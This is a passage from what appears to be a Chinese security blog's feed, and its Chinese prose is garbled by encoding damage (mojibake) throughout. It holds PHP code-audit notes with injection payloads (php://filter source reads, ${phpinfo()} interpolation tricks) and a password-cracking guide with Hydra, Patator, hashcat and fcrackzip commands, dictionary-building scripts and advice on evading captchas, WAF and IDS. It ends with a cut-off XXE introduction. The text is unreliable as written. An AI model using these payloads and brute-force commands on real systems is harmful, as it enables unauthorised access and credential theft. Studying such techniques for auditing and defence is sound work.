<p>mixed preg_replace ( mixed $pattern , mixed $replacement , mixed $subject )<br>æœç´¢subjectä¸­åŒ¹é…pattern,ç”¨replacementæ›¿æ¢ã€‚å¦‚æœpatternå¤„å­˜åœ¨/eå‚æ•°ï¼Œåˆ™replacementçš„å€¼ä¼šè¢«å½“æˆPHPä»£ç æ¥æ‰§è¡Œã€‚</p>
<p>å‘½ä»¤æ‰§è¡Œæ¼æ´å‡½æ•°ï¼š</p>
<blockquote>
<p>system(),exec(),shell_exec(),passyhru(),pcntl_exec(),popen(),proc_open(),`</p>
</blockquote>
<p>å‘½ä»¤æ‰§è¡Œé˜²æ³¨å…¥å‡½æ•°ï¼š</p>
<pre><code>escapeshellcmd(),è¿‡æ»¤æ•´æ¡å‘½ä»¤(åŠ ^)
&lt;?php 
    echo (escapeshellcmd($_GET[&apos;cmd&apos;]));
?&gt;
?cmd=whoami()
è¾“å‡ºï¼šwhoami^()
escapesshellarg(),ä¿è¯ä¼ å…¥å‘½ä»¤çš„å‚æ•°æ˜¯ä»¥å­—ç¬¦ä¸²çš„å½¢å¼å­˜åœ¨
&lt;?php 
    echo &apos;ls &apos;.escapeshellarg(&apos;cmd&quot;&apos;);
?&gt;
è¾“å‡ºï¼šls &quot;cmd &quot;
</code></pre><p>is_numeric()å‡½æ•°ä½¿ç”¨åå…­è¿›åˆ¶ç»•è¿‡</p>
<p>==åœ¨åˆ¤æ–­ä¹‹å‰å…ˆåšå˜é‡ç±»å‹è½¬æ¢ï¼Œå³åªåˆ¤æ–­å€¼</p>
<p>===ä¸ä¼šè½¬æ¢ï¼Œå³æ—¢åˆ¤æ–­å€¼è¿˜åˆ¤æ–­ç±»å‹</p>
<p>%00=NULL=0</p>
<p>httpå¤´æ³¨å…¥å¸¸è§çš„:user-agent,referer,client-ip/x-forward-for</p>
<p>$_SERVERå’Œ$_FILESå˜é‡ä¸å—GPCä¿æŠ¤</p>
<p>æ˜¾ç¤ºé”™è¯¯ä¿¡æ¯çš„å‡½æ•°å¼€å…³:display_errorså’Œerror_reporting</p>
<p>PHPæ˜¯åŸºäºCå¼€å‘ï¼Œ<code>%00</code>åœ¨URLç¼–ç åå¸‚<code>\0</code>ï¼Œ<code>\0</code>åœ¨Cè¯­è¨€ä¸­æ˜¯å­—ç¬¦ä¸²çš„ç»“æŸç¬¦ã€‚</p>
<p>iconvå‡½æ•°å­—ç¬¦ç¼–ç è½¬æ¢è¿‡ç¨‹ä¸­é‡åˆ°ä¸èƒ½å¤„ç†çš„å­—ç¬¦ä¸²åˆ™åç»­çš„å­—ç¬¦ä¸²ä¹Ÿä¸ä¼šå¤„ç†ï¼Œå¯¼è‡´æˆªæ–­ï¼ˆchar(128)åˆ°char(255)ä¹‹é—´éƒ½å¯ä»¥ï¼‰</p>
<p><strong>php://è¾“å…¥è¾“å‡ºæµ</strong></p>
<p><code>php://input</code>å¯ä»¥è®¿é—®è¯·æ±‚çš„åŸå§‹æ•°æ®çš„åªè¯»æµï¼Œå³å¯ä»¥ç›´æ¥è¯»å–åˆ°POSTä¸Šæ²¡æœ‰ç»è¿‡è§£æçš„åŸå§‹æ•°æ®ã€‚</p>
<p><code>php://output</code>æ˜¯ä¸€ä¸ªåªå†™æµï¼Œå°†æµæ•°æ®è¾“å‡º</p>
<p><code>php://filter</code>æ˜¯ä¸€ä¸ªæ–‡ä»¶æ“ä½œåè®®ï¼Œå¯ä»¥å¯¹ç£ç›˜ä¸­çš„æ–‡ä»¶è¿›è¡Œè¯»å†™æ“ä½œ</p>
<pre><code>php://filter/write=string.rot13/resource=example.txt,&quot;hello world&quot;

php://filter/convert.base64-encode/resource=index.php
</code></pre><p><strong>PHPä»£ç è§£ææ ‡ç­¾</strong></p>
<p>è„šæœ¬æ ‡ç­¾: <code>&lt;script language=&quot;php&quot;&gt;...&lt;/script&gt;</code></p>
<p>çŸ­æ ‡ç­¾ï¼š<code>&lt;?...?&gt;</code>,éœ€è¦php.iniä¸­short_open_tag=on,é»˜è®¤æ˜¯on</p>
<p>aspæ ‡ç­¾ï¼š<code>&lt;%...%&gt;</code>,éœ€è¦php.iniä¸­asp_tags=onï¼Œé»˜è®¤æ˜¯off</p>
<p>client-ipçš„æ­£åˆ™è§„åˆ™ï¼š<code>^\d+\.\d+\.\d+\.\d+$</code></p>
<p>test.php%00jpg</p>
<p>mysqlæŠ¥é”™æ³¨å…¥çš„å‡½æ•°ï¼š<code>floor(),updatexml(),extractvalue()</code></p>
<p>å…·ä½“ä»‹ç»è¯·å‚è€ƒï¼š<a href="http://byd.dropsec.xyz/2016/08/02/Mysql%E6%B3%A8%E5%85%A5%E6%80%BB%E7%BB%93/">MySqlæ³¨å…¥æ€»ç»“</a></p>
<p>windows findfirstfileåˆ©ç”¨ï¼šå³ä½¿ç”¨<code>&lt;</code>,<code>&gt;</code>æ¥ä»£æ›¿ä¸å¯çŸ¥çš„æ–‡ä»¶åéƒ¨åˆ†ï¼Œå¦‚123.txtå¯ä»¥ä½¿ç”¨1&lt;&lt;æ¥æ›¿æ¢ã€‚</p>
<p>PHPä¸­å•å¼•å·ä»£è¡¨çº¯å­—ç¬¦ä¸²ï¼ŒåŒå¼•å·åˆ™æ˜¯ä¼šè§£æä¸­é—´çš„å˜é‡ï¼š</p>
<pre><code>&lt;?php $a=&quot;${@phpinfo()}&quot;;?&gt;        #ç¬¬ä¸€ä¸ªå­—ç¬¦ä¸º@
&lt;?php $a=&quot;${ phpinfo()}&quot;;?&gt;        #ç¬¬ä¸€ä¸ªå­—ç¬¦ä¸ºç©ºæ ¼
&lt;?php $a=&quot;${    phpinfo()}&quot;;?&gt;    #ç¬¬ä¸€ä¸ªå­—ç¬¦ä¸ºTAB
&lt;?php $a=&quot;${/**/phpinfo()}&quot;;?&gt;    #ç¬¬ä¸€ä¸ªå­—ç¬¦ä¸ºæ³¨é‡Šç¬¦
&lt;?php $a=&quot;${
phpinfo()}&quot;;?&gt;                    #ç¬¬ä¸€ä¸ªå­—ç¬¦ä¸ºå›è½¦æ¢è¡Œ
&lt;?php $a=&quot;${+phpinfo()}&quot;;?&gt;        #ç¬¬ä¸€ä¸ªå­—ç¬¦ä¸º+
&lt;?php $a=&quot;${-phpinfo()}&quot;;?&gt;        #ç¬¬ä¸€ä¸ªå­—ç¬¦ä¸º-
&lt;?php $a=&quot;${!phpinfo()}&quot;;?&gt;        #ç¬¬ä¸€ä¸ªå­—ç¬¦ä¸ºï¼
æ­¤å¤–è¿˜æœ‰~ï¼Œ\ç­‰
</code></pre><p>å¯¹ç§°åŠ å¯†ç®—æ³•ï¼š<code>DES,3DES,TDEA,RC2,RC4,IDEA,AES</code></p>
<p>éå¯¹ç§°åŠ å¯†ï¼š<code>RSA</code></p>
<p>å•å‘åŠ å¯†ï¼š<code>MD4,MD5,sha1</code></p>
<p>éªŒè¯ç ç»•è¿‡ï¼š</p>
<pre><code>1.ä¸åˆ·æ–°ç›´æ¥ç»•è¿‡
2.æš´åŠ›ç ´è§£
3.æœºå™¨è¯†åˆ«
4.æ‰“ç å¹³å°
</code></pre><p>ç”¨æˆ·ç™»å½•æ¼æ´ï¼š</p>
<pre><code>1.æ’åº“æ¼æ´
    ç”¨æˆ·åå¯†ç é”™è¯¯æ¬¡æ•°éƒ½æ— é™åˆ¶
    å•æ—¶é—´æ®µå†…ç”¨æˆ·çš„å¯†ç é”™è¯¯æ¬¡æ•°é™åˆ¶
    å•æ—¶é—´æ®µå†…IPç™»é™†é”™è¯¯æ¬¡æ•°é™åˆ¶
2.APIç™»é™†
</code></pre><p>æœ€åé™„ä¸Šä¸€ä¸ªæœé›†çš„PHPä»£ç å®¡è®¡è„‘å›¾</p>
<p><img src="http://oa8y5guqs.bkt.clouddn.com/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E8%84%91%E5%9B%BE.png" alt=""></p>
]]></content>
      
        
        <tags>
            
            <tag> XSS </tag>
            
            <tag> WAFç»•è¿‡ </tag>
            
            <tag> PHP </tag>
            
            <tag> å‘½ä»¤æ‰§è¡Œ </tag>
            
            <tag> SQLæ³¨å…¥ </tag>
            
            <tag> ä»£ç å®¡è®¡ </tag>
            
            <tag> æ–‡ä»¶åŒ…å« </tag>
            
            <tag> å®‰å…¨å¼€å‘ </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[æ¸—é€æµ‹è¯•:å¯†ç ç ´è§£æ€»ç»“]]></title>
      <url>/2016/08/17/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%EF%BC%9A%E5%AF%86%E7%A0%81%E7%A0%B4%E8%A7%A3%E6%80%BB%E7%BB%93/</url>
      <content type="html"><![CDATA[<h1 id="0x00-å‰è¨€"><a href="#0x00-å‰è¨€" class="headerlink" title="0x00 å‰è¨€"></a>0x00 å‰è¨€</h1><p>ä¸€æ¬¡æ¸—é€æµ‹è¯•çš„è¿‡ç¨‹æ€»ä¼šæ¶‰åŠåˆ°â€å¯†ç â€ä¸â€åŠ è§£å¯†â€.åœ¨æµ‹è¯•çš„è¿‡ç¨‹ä¸­,å¯¹å¼±å£ä»¤çš„å°è¯•æ˜¯å¿…ä¸å¯å°‘çš„è¿‡ç¨‹ã€‚</p>
<a id="more"></a>
<h1 id="0x01-æ•´ç†ä¸€ä»½ä¼˜ç§€çš„å­—å…¸"><a href="#0x01-æ•´ç†ä¸€ä»½ä¼˜ç§€çš„å­—å…¸" class="headerlink" title="0x01 æ•´ç†ä¸€ä»½ä¼˜ç§€çš„å­—å…¸"></a>0x01 æ•´ç†ä¸€ä»½ä¼˜ç§€çš„å­—å…¸</h1><p>æƒ³ç ´è§£å¯†ç ,è¦æ±‚æˆ‘ä»¬å·²ç»â€æ‹¥æœ‰â€åˆ«äººçš„å¯†ç .è¦æ•´ç†ä¸€ä»½ä¼˜ç§€çš„å­—å…¸,å¯ä»¥å‚è€ƒå„å¤§ç½‘ç«™æ³„æ¼æ•°æ®åº“,å°†å¯†ç (æ˜æ–‡)å­—æ®µæ”¶é›†å,ä¾å‡ºç°é¢‘ç‡å…ˆåç”Ÿæˆå­—å…¸.</p>
<p>è¿™é‡Œä½¿ç”¨ä¸€ä¸ªå¯¹å·²çŸ¥çš„å­—å…¸æ–‡ä»¶æ ¹æ®ä½¿ç”¨é¢‘ç‡æ’åºå¹¶è¾“å‡ºçš„pythonè„šæœ¬ï¼š</p>
<pre><code>#!/bin/bash/python
#+------------------------------+
#@Author:Joy_nick
#@Blog:http://byd.dropsec.xyz/
#+------------------------------+
import sys
from collections import Counter

file = open(sys.argv[1], &apos;r&apos;)
readlist = []
count_times = []
for line in file.readlines():
    line = line.strip(&apos;\r\n &apos;)
    readlist.append(line)
sortlist = Counter(readlist).most_common()
for line in sortlist:
    print line[0]
</code></pre><p>ç¤ºä¾‹ï¼š</p>
<p><img src="http://oa8y5guqs.bkt.clouddn.com/%E5%AF%86%E7%A0%81%E7%A0%B4%E8%A7%A3_1.png" alt=""></p>
<h1 id="0x02-ä¸€æ‰‹ç§°å¿ƒå¦‚æ„çš„å·¥å…·é›†"><a href="#0x02-ä¸€æ‰‹ç§°å¿ƒå¦‚æ„çš„å·¥å…·é›†" class="headerlink" title="0x02 ä¸€æ‰‹ç§°å¿ƒå¦‚æ„çš„å·¥å…·é›†"></a>0x02 ä¸€æ‰‹ç§°å¿ƒå¦‚æ„çš„å·¥å…·é›†</h1><p>æ¬²å–„å…¶äº‹,é¡»åˆ©å…¶å™¨.å¯†ç æšä¸¾å·¥å…·ä¸¾ä¸€äº›ä¾‹å­ï¼š</p>
<ul>
<li>Hydra :å„ç§æœåŠ¡è´¦æˆ·å¯†ç çŒœè§£</li>
<li>Medusa : ç±»ä¼¼Hydra</li>
<li>Patator : Pythonå¤šåè®®ï¼Œå…¨èƒ½æš´åŠ›ç ´è§£ï¼Œæ¨¡å—åŒ–è®¾è®¡æµ‹è¯•å·¥å…·</li>
<li>Hashcat : GPUå“ˆå¸Œç ´è§£</li>
<li>BurpSuite : å¤šçº¿ç¨‹å¯†ç æšä¸¾</li>
<li>Rcracki : å½©è™¹è¡¨å“ˆå¸Œç ´è§£</li>
<li>Ophcrack : ç¦»çº¿LMHash/NTHashç ´è§£</li>
<li>Fcrackzip/Truecrackç­‰ç‰¹å®šæ–‡ä»¶å¯†ç ç ´è§£å·¥å…·</li>
<li>Metasploit : å„ç§è¾…åŠ©æµ‹è¯•è„šæœ¬</li>
<li>Cupp.py : ç¤¾å·¥å­—å…¸ç”Ÿæˆ</li>
<li>â€¦</li>
</ul>
<h1 id="0x03-ç»•è¿‡æ£€æµ‹"><a href="#0x03-ç»•è¿‡æ£€æµ‹" class="headerlink" title="0x03 ç»•è¿‡æ£€æµ‹"></a>0x03 ç»•è¿‡æ£€æµ‹</h1><p>Webå±‚æœ‰WAF,Serviceæœ‰IDS/IPS,åœ¨æµ‹è¯•çš„æ—¶å€™å¾ˆå®¹æ˜“è¢«å‘ç°ã€‚åœ¨æµ‹è¯•å‰,å…ˆé€šè¿‡æ‰«æç­‰æ–¹å¼åˆ¤æ–­æ˜¯å¦æœ‰ç›¸åº”çš„é˜²æŠ¤,å¹¶é‡‡å–ç›¸åº”æ‰‹æ®µ.Webå±‚å¯èƒ½æœ‰éªŒè¯ç ,å¯èƒ½æœ‰æ¯ç§’IPè¿æ¥æ•°é™åˆ¶,å¯èƒ½é€šè¿‡Cookie/Headerç­‰ä¿¡æ¯åˆ¤æ–­è¡Œä¸º.åœ¨é€šè¿‡ä¸€ç³»åˆ—æµ‹è¯•å,(å¦‚ä½•æµ‹è¯•è¿˜æ˜¯è¦è‡ªå·±æ¢ç´¢çš„),é‡‡ç”¨æœ€åˆç†çš„é’ˆå¯¹æ–¹å¼ç»•è¿‡æˆ–å°½é‡é¿å…è¢«æ£€æµ‹è€Œæ‹¦æˆªæšä¸¾è´¦æˆ·å¯†ç ã€‚</p>
<h1 id="0x04-Webè´¦æˆ·æšä¸¾"><a href="#0x04-Webè´¦æˆ·æšä¸¾" class="headerlink" title="0x04 Webè´¦æˆ·æšä¸¾"></a>0x04 Webè´¦æˆ·æšä¸¾</h1><p>Webè´¦æˆ·æšä¸¾æ˜¯å¹³æ—¥é‡åˆ°è¾ƒå¤šçš„æƒ…å†µ</p>
<ul>
<li>æ²¡æœ‰åšä¸¥è°¨çš„éªŒè¯ç ç­‰é˜²æŠ¤.</li>
<li>å‘ç°åˆ«äººç•™ä¸‹çš„backdoor.</li>
<li>æ’åº“æ‰«å·.</li>
</ul>
<p>å¸¸è§çš„ç»•è¿‡éªŒè¯çš„å¯èƒ½:</p>
<ul>
<li>é¡µé¢æ— éœ€åˆ·æ–°éªŒè¯ç æ— é™æ¬¡ä½¿ç”¨</li>
<li>å¯†ç è¾“å…¥é”™è¯¯æ•°æ¬¡å¼¹å‡ºéªŒè¯ç ï¼Œä½†æ›´æ¢è´¦å·ä¸ä¼šå‡ºç°éªŒè¯ç </li>
<li>ä¿®æ”¹Cookieæˆ–User-Agentä¼ªè£…é€ƒé¿éªŒè¯ç </li>
<li>å¯æ‰¹é‡è½®è¯¢ä½¿ç”¨ä»£ç†ipæšä¸¾ç»•è¿‡</li>
</ul>
<p>åœ¨Webæšä¸¾ä¸­,ä½¿ç”¨BurpSuiteåŸºæœ¬å¯ä»¥è§£å†³æ‰€æœ‰å¸¸è§é—®é¢˜.</p>
<p>å¼€å¯ä»£ç†,æ‰“å¼€Intercept,ç™»é™†ç½‘é¡µ,è¾“å…¥ç”¨æˆ·å¯†ç ,æ•°æ®åŒ…æ‹¦æˆªä¸‹æ¥,é€‰æ‹©Send to Intruder,è¿›å…¥æ”»å‡»æ¨¡å—.</p>
<p>å…¶ä¸­å››ç§æ¨¡å¼:</p>
<pre><code>Sniper:åªæœ‰ä¸€ä¸ªpayload,ä¼šå°†payloadåˆ†åˆ«æ”¾åœ¨æ¯ä¸ªFuzzç‚¹æµ‹è¯•,é»˜è®¤é€‰é¡¹,è¿™ä¹Ÿæ˜¯æ–°æ‰‹å‘ç°Payloadåªèƒ½é€‰æ‹©1çš„åŸå› .

Battering Ram:åªæœ‰ä¸€ä¸ªpayload,ä¼šå°†payloadåŒæ—¶æ”¾åœ¨å¤šä¸ªFuzzç‚¹æµ‹è¯•.

Pitchfork:å¤šä¸ªpayload,ä¼šå°†å¤šä¸ªpayloadåŒä¸€è¡ŒåŒæ—¶æ”¾åˆ°ç›¸åº”Fuzzç‚¹æµ‹è¯•.(é€‚ç”¨æ‰«å·)

Cluster Bomb:å¤šä¸ªpayload,payloadåœ¨å…¶Fuzzç‚¹å¾ªç¯æµ‹è¯•,ç›´åˆ°å°è¯•æ‰€æœ‰å¯èƒ½.(é€‚ç”¨å¤šè´¦æˆ·æšä¸¾å¯†ç )
</code></pre><p>é€‰æ‹©å¥½ç›¸åº”æ¨¡å¼å,è®¾ç½®payloadä¸ºruntime file,æŒ‚è½½å­—å…¸æ–‡ä»¶.å–æ¶ˆPayload Encoding.</p>
<p>å¦‚æœå‘ç°ç½‘é¡µæœ‰å°†ç”¨æˆ·çš„æœ¬åœ°å°†å¯†ç è®¡ç®—MD5åæäº¤,åˆ™éœ€è¦åœ¨Payload Processingä¸­æ·»åŠ è®¡ç®—MD5çš„è¿‡ç¨‹.</p>
<p>è®¾ç½®å¥½åä¹Ÿå¯æ·»åŠ æ­£åˆ™åŒ¹é…ç»“æœç­‰ç­‰.ä¹‹åå¯ä»¥Start attackäº†.</p>
<p>è¿™ä¸ªè¿‡ç¨‹ä¸­,å¦‚æœæ‹…å¿ƒIPåœ°å€æš´éœ²,å¯ä»¥é€‰æ‹©åŠ å…¥ä¸€ä¸ªclient-ipè¿™ä¸ªpayloadæ¥ä»£ç†ipã€‚</p>
<h1 id="0x05-HTTPåŸºç¡€è®¤è¯"><a href="#0x05-HTTPåŸºç¡€è®¤è¯" class="headerlink" title="0x05 HTTPåŸºç¡€è®¤è¯"></a>0x05 HTTPåŸºç¡€è®¤è¯</h1><p>æŠ“åŒ…å¯ä»¥çœ‹åˆ°,ä»¥é»˜è®¤ç”¨æˆ·åadmin,é»˜è®¤å¯†ç adminç™»é™†è·¯ç”±,HTTP Headerå¤šçš„éƒ¨åˆ†åƒæ˜¯è¿™æ ·:</p>
<pre><code>Authorization: Basic YWRtaW46YWRtaW4=
</code></pre><p>Base64è§£å¯†å³ä¸ºadmin:admin.é’ˆå¯¹åŸºç¡€è®¤è¯å¯†ç ç ´è§£,ä¾æ—§å¯ä»¥ä½¿ç”¨,ä½†éœ€è¦å¯¹ç”¨æˆ·åå¯†ç å…ˆåšå¤„ç†å³å…ˆbase64ç¼–ç ä¸‹,ä¸€ä¸ªdemoè„šæœ¬å¦‚ä¸‹:</p>
<pre><code>#!/usr/bin/python
#+------------------------------+
#@Author:Joy_nick
#@Blog:http://byd.dropsec.xyz/
#+------------------------------+
import os.path,sys,base64

userfile = raw_input(&quot;input usr file:&quot;)
passfile = raw_input(&quot;input pwd file:&quot;)
outputfile = raw_input(&quot;input out file:&quot;)
outputfile = open(outputfile, &quot;w&quot;)
userInfile = open(userfile)
passInfile = open(passfile)
userLines = userInfile.readlines()
passLines = passInfile.readlines()

for userLine in userLines:
    for passLine in passLines:
        combinedLine = userLine.strip() + &apos;:&apos; + passLine.strip()
        print combinedLine
        outputfile.write(base64.b64encode(combinedLine) + &apos;\n&apos;)
userInfile.close()
passInfile.close()
outputfile.close()
</code></pre><p>ç”Ÿæˆå­—å…¸åä»¥Burpçˆ†ç ´å³å¯.</p>
<p>ä¹Ÿå¯ä»¥ä½¿ç”¨Hydra</p>
<pre><code>hydra -L user.txt -P pass.txt -F http://demourl:2048/auth
å…¶ä¸­-Lå’Œ-På¤§å†™å‡ä¸ºæŒ‚è½½å­—å…¸,-Fè¡¨ç¤ºå…¨å±€ä¸€æ—¦å‘ç°åˆæ³•ç”¨æˆ·å¯†ç å³åœæ­¢ç ´è§£,äº¦å¯åŠ å…¥-tå‚æ•°æŒ‡å®šçº¿ç¨‹æ•°.
</code></pre><h1 id="0x06-æœåŠ¡å¯†ç ç ´è§£"><a href="#0x06-æœåŠ¡å¯†ç ç ´è§£" class="headerlink" title="0x06 æœåŠ¡å¯†ç ç ´è§£"></a>0x06 æœåŠ¡å¯†ç ç ´è§£</h1><p>å¸¸è§æœåŠ¡å¦‚FTP/SSH/TELNET/POP3/1433ç­‰çš„ç ´è§£æšä¸¾.</p>
<ul>
<li><p>FTP</p>
<pre><code>hydra -L user.txt -P pass.txt -F ftp://127.0.0.1:21
</code></pre></li>
<li><p>SSH</p>
<pre><code>hydra -L user.txt -P pass.txt -F ssh://127.0.0.1:22

patator ssh_login host=127.0.0.1 user=root password=FILE0 0=pass.txt -x ignore:mesg=&apos;Authentication failed.&apos;
</code></pre></li>
<li><p>SMB</p>
<pre><code>hydra -L user.txt -P pass.txt -F smb://127.0.0.1
</code></pre></li>
<li><p>MSSQL</p>
<pre><code>hydra -L user.txt -P pass.txt -F mssql://127.0.0.1:1433
</code></pre></li>
</ul>
<h1 id="0x07-ç¤¾å·¥å­—å…¸ç”Ÿæˆ"><a href="#0x07-ç¤¾å·¥å­—å…¸ç”Ÿæˆ" class="headerlink" title="0x07 ç¤¾å·¥å­—å…¸ç”Ÿæˆ"></a>0x07 ç¤¾å·¥å­—å…¸ç”Ÿæˆ</h1><p>ä»¥cupp.pyå·¥å…·ä¸ºä¾‹,åˆ›å»ºæ–°å­—å…¸ä½¿ç”¨:</p>
<pre><code>python cupp.py -i

ç”¨æ³•ï¼š cupp.py [é€‰é¡¹]

h å¸®åŠ©
i äº¤äº’å¼å¡«å†™ç”¨æˆ·å¯†ç ç­‰ç›¸å…³ä¿¡æ¯
w é…ç½®ç°æœ‰çš„å­—å…¸æ–‡ä»¶
l ä»åº“ä¸­ä¸‹è½½
a ç›´æ¥ä½¿ç”¨Alectoæ•°æ®åº“çš„é»˜è®¤ç”¨æˆ·åå’Œå¯†ç 
v ç‰ˆæœ¬ä¿¡æ¯
</code></pre><p>åœ¨å¡«å†™ç›¸å…³ä¿¡æ¯åç”Ÿæˆå­—å…¸,ç„¶åå°±å¯ä»¥æšä¸¾äº†ã€‚</p>
<h1 id="0x08-å“ˆå¸Œç ´è§£"><a href="#0x08-å“ˆå¸Œç ´è§£" class="headerlink" title="0x08 å“ˆå¸Œç ´è§£"></a>0x08 å“ˆå¸Œç ´è§£</h1><p>æ™®é€šå“ˆå¸Œå¯ä»¥ä½¿ç”¨Ophcrackç ´è§£,å®˜ç½‘ç»™å‡ºäº†å¯¹åº”çš„å½©è™¹è¡¨ä¸‹è½½,å½“ç„¶,ä¹Ÿå¯ä»¥ç›´æ¥æŸ¥è¯¢.</p>
<pre><code>http://www.objectif-securite.ch/en/ophcrack.php
</code></pre><p>éœ€è¦ç ´è§£å…¶ä»–ä¸å¸¸è§å¯†ç å“ˆå¸Œ(å€ŸåŠ©å·²æœ‰webç ´è§£æœåŠ¡æ— æ³•è§£å†³),æš‚æ—¶ä¾¿åªæœ‰ä¸‰ä¸ªç›¸å¯¹é«˜æ•ˆçš„æ–¹æ³•:</p>
<ul>
<li>åˆ†å¸ƒå¼</li>
<li>GPU</li>
<li>å½©è™¹è¡¨ (æ²¡ç¡¬ç›˜çš„å°±åˆ«æƒ³äº†)</li>
</ul>
<p>è€Œå¦‚æœæˆ‘ä»¬åœ¨çŸ¥é“å¯†ç çš„ä¸€å®šè§„åˆ™å,äº¦å¯æŒ‰ç…§è§„åˆ™ç ´è§£å¯†ç .</p>
<pre><code>hashcat -m1800 -a3 hashdumpedfile --pw-min=7 --pw-max=11  &quot;hahaha?l?l?l?l&quot;
</code></pre><p>å…·ä½“çš„hashcatå¯†ç ç ´è§£è¯¦æƒ…è¯·å‚è€ƒï¼š<a href="http://byd.dropsec.xyz/2016/08/10/HashCat%E4%BD%BF%E7%94%A8%E6%89%8B%E5%86%8C/">HashCatä½¿ç”¨æ‰‹å†Œ</a></p>
<h1 id="0x09-æ–‡ä»¶å¯†ç "><a href="#0x09-æ–‡ä»¶å¯†ç " class="headerlink" title="0x09 æ–‡ä»¶å¯†ç "></a>0x09 æ–‡ä»¶å¯†ç </h1><p>å¯¹äºzipæ–‡ä»¶,ç”±äºåŠ å¯†æ–¹å¼æ²¡æœ‰rarå¼ºåŠ¿,æ•…è¢«è§£å¯†çš„å¯èƒ½æ€§å¾ˆå¤§,ä¸€ä¸ªkaliä¸‹çš„ç ´è§£å·¥å…·å‘½ä»¤å¦‚ä¸‹:</p>
<pre><code>fcrackzip -b -v -c a -l 1-4 -u 1.zip
</code></pre><p>-bæŒ‡å®šæš´åŠ›ç ´è§£,-væ˜¾ç¤ºè¯¦ç»†ä¿¡æ¯,-c aæŒ‡å®šå¯†ç ä¸ºçº¯å­—æ¯,-l 1-4æŒ‡å®šå¯†ç é•¿åº¦ä½1-4ä½,-uæŒ‡ä½¿ç”¨å¯èƒ½çš„å¯†ç è¿›è¡Œè§£å‹ç¼©æµ‹è¯•(åŠ ä¸Š,å¦åˆ™ä¼šå‡ºç°å¾ˆå¤šå¹²æ‰°å¯†ç )</p>
<p>å…·ä½“çš„å…¶ä»–è¯­æ³•è¯·å‚è€ƒï¼š<a href="http://ylq365.iteye.com/blog/1915531" target="_blank" rel="external">fcrackzipè¯­æ³•ç¤ºä¾‹</a></p>
]]></content>
      
        
        <tags>
            
            <tag> çˆ†ç ´ </tag>
            
            <tag> æ¸—é€æµ‹è¯• </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[XXE Injectæ”»å‡»ä¸é˜²å¾¡]]></title>
      <url>/2016/08/16/XXE-Inject%E6%94%BB%E5%87%BB%E4%B8%8E%E9%98%B2%E5%BE%A1/</url>
      <content type="html"><![CDATA[<h1 id="0x00-å‰è¨€"><a href="#0x00-å‰è¨€" class="headerlink" title="0x00 å‰è¨€"></a>0x00 å‰è¨€</h1><p>XXE Injectionå³XML External Entity Injection,ä¹Ÿå°±æ˜¯XMLå¤–éƒ¨å®ä½“æ³¨å…¥æ”»å‡».</p>
<p>åœ¨XML1.0æ ‡å‡†â¾¥é‡Œ,XMLæ–‡æ¡£ç»“æ„é‡Œå®šä¹‰äº†å®ä½“(entity)è¿™ä¸ªæ¦‚å¿µ.å®ä½“å¯ä»¥é€šè¿‡é¢„å®šä¹‰åœ¨æ–‡æ¡£ä¸­è°ƒç”¨,å®ä½“çš„æ ‡è¯†ç¬¦å¯è®¿é—®æœ¬åœ°æˆ–è¿œç¨‹å†…å®¹.å¦‚æœåœ¨è¿™ä¸ªè¿‡ç¨‹ä¸­å¼•å…¥äº†â€æ±¡æŸ“â€æº,åœ¨å¯¹XMLæ–‡æ¡£å¤„ç†ååˆ™å¯èƒ½å¯¼è‡´ä¿¡æ¯æ³„æ¼ç­‰å®‰å…¨é—®é¢˜.<br><a id="more"></a></p>
<h1 id="0x01-ç®€ä»‹"><a href="#0x01-ç®€ä»‹" class="headerlink" title="0x01 ç®€ä»‹"></a>0x01 ç®€ä»‹</h1><p>DTDï¼ˆæ–‡æ¡£ç±»å‹å®šä¹‰ï¼‰çš„ä½œç”¨æ˜¯å®šä¹‰ XML æ–‡æ¡£çš„åˆæ³•æ„å»ºæ¨¡å—ã€‚DTD å¯ä»¥åœ¨ XML æ–‡æ¡£å†…å£°æ˜ï¼Œä¹Ÿå¯ä»¥å¤–éƒ¨å¼•ç”¨ã€‚</p>
<pre><code>&lt;!DOCTYPE æ ¹å…ƒç´  [å…ƒç´ å£°æ˜]&gt;

&lt;!DOCTYPE æ ¹å…ƒç´  SYSTEM &quot;æ–‡ä»¶å&quot;&gt;
</code></pre><p>DTDå®ä½“entityï¼Œä¸€èˆ¬åˆ†ä¸ºå‚æ•°å®ä½“(å¤–éƒ¨å®ä½“)å’Œå†…éƒ¨å®ä½“ï¼›å‚æ•°å®ä½“æ˜¯ä¸€ç§åªèƒ½åœ¨DTDä¸­å®šä¹‰å’Œä½¿ç”¨çš„å®ä½“ï¼Œä¸€èˆ¬å¼•ç”¨æ—¶ä½¿ç”¨%ä½œä¸ºå‰ç¼€ï¼›å†…éƒ¨å®ä½“æ˜¯æŒ‡ç”¨äºå®šä¹‰å¼•ç”¨æ™®é€šæ–‡æœ¬æˆ–ç‰¹æ®Šå­—ç¬¦çš„å¿«æ·æ–¹å¼çš„å˜é‡ï¼Œå¯ä»¥å†…éƒ¨å£°æ˜æˆ–å¤–éƒ¨å¼•ç”¨.</p>
<pre><code>&lt;!ENTITY å®ä½“åç§° &quot;å®ä½“çš„å€¼&quot;&gt;

&lt;!ENTITY å®ä½“åç§° SYSTEM &quot;URI&quot;&gt;
</code></pre><p>æ‰€ä»¥åœ¨XMLä¸­å®ä½“çš„ç”¨æ³•å¦‚ä¸‹ï¼š</p>
<pre><code>ENTITYçš„å®šä¹‰è¯­æ³•ï¼š

&lt;!DOCTYPE filename
[  
    &lt;!ENTITY entity-name &quot;entity-content&quot;  
]&gt;

//è¿™å°±æ˜¯DTDäº†
</code></pre><p>å®šä¹‰å¥½çš„ENTITYåœ¨æ–‡æ¡£ä¸­é€šè¿‡â€œ&amp;å®ä½“å;â€æ¥ä½¿ç”¨ã€‚<br>ç±»ä¼¼äºå®å®šä¹‰çš„ä¸€ç§ä¸œè¥¿ã€‚</p>
<h1 id="0x02-å¨èƒ"><a href="#0x02-å¨èƒ" class="headerlink" title="0x02 å¨èƒ"></a>0x02 å¨èƒ</h1><p>å€ŸåŠ©XXE,æ”»å‡»è€…å¯ä»¥å®ç°<strong>ä»»æ„æ–‡ä»¶è¯»å–</strong>,<strong>DOSæ‹’ç»æœåŠ¡æ”»å‡»</strong>ä»¥åŠ<strong>ä»£ç†æ‰«æå†…ç½‘</strong>ç­‰.</p>
